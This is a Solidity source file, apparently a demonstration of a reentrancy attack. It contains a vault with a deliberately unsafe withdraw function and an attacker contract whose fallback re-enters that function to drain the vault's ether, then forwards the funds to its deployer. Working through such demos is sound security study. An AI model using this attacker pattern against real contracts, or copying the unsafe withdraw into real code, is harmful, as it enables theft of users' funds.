// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";


interface IVault {
    function deposit() external payable;

    function withdrawSafe(address payable holder) external;

    function withdrawUnsafe(address payable holder) external;
}


interface IAttacker {
    function depositToVault(address vault) external payable;

    function attack(address vault) external;
}


interface IHelper {
    function depositToVault(address vault) external payable;
}


contract Vault is IVault, ReentrancyGuard {

    mapping(address => uint256) public balance;

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdrawSafe(address payable holder) external nonReentrant {
        uint256 addressBalance = balance[holder];
        require(addressBalance > 0, "There's no ether on the balance");

        (bool isSent, ) = holder.call{value: addressBalance}("");

        require(isSent, "ether was not sent");
        balance[holder] = 0;
    }

    function withdrawUnsafe(address payable holder) external {
        uint256 addressBalance = balance[holder];
        require(addressBalance > 0, "There's no ether on the balance");

        (bool isSent, ) = holder.call{value: addressBalance}("");

        require(isSent, "ether was not sent");
        balance[holder] = 0;
    }
}


contract AttackerHelper is IHelper {

    function depositToVault(address vault) external payable {
        IVault(vault).deposit{value: msg.value}();
    }
}


contract Attacker is IAttacker {

    address public daddy;
    address public attackerHelper;


    constructor (address attackerHelper_) {
        daddy = msg.sender;
        attackerHelper = attackerHelper_;
    }

    function depositToVault(address vault) external payable {
        IVault(vault).deposit{value: msg.value}();
    }

    fallback() external payable {
        Vault vaultContract = Vault(msg.sender);

        uint256 vaultTotalBalance = msg.sender.balance;
        uint256 vaultAttackerDeposit = vaultContract.balance(address(this));
        
        if (vaultTotalBalance >= vaultAttackerDeposit) {
            vaultContract.withdrawUnsafe(payable(address(this)));
        } else if (vaultTotalBalance != 0) {
            // Transferring leftover through another contract
            // to make our deposit be equal to the actual balance.
            // Another contract is needed just to transfer ether from another address.
            uint256 leftover = vaultAttackerDeposit - vaultTotalBalance;
            IHelper(attackerHelper).depositToVault{value: leftover}(msg.sender);
            Vault(msg.sender).withdrawUnsafe(payable(address(this)));
        }
    }

    function attack(address vault) external {
        address payable currentAddress = payable(address(this));
        IVault(address(vault)).withdrawUnsafe(currentAddress);
    }

    function moneyTime() external {
        require(daddy == msg.sender, "your're not my daddy");
        
        (bool isSent, ) = msg.sender.call{value: address(this).balance}("");
    
        require(isSent, "An error occurred transferring money to my daddy");
    }

    function donate() external payable {}
}
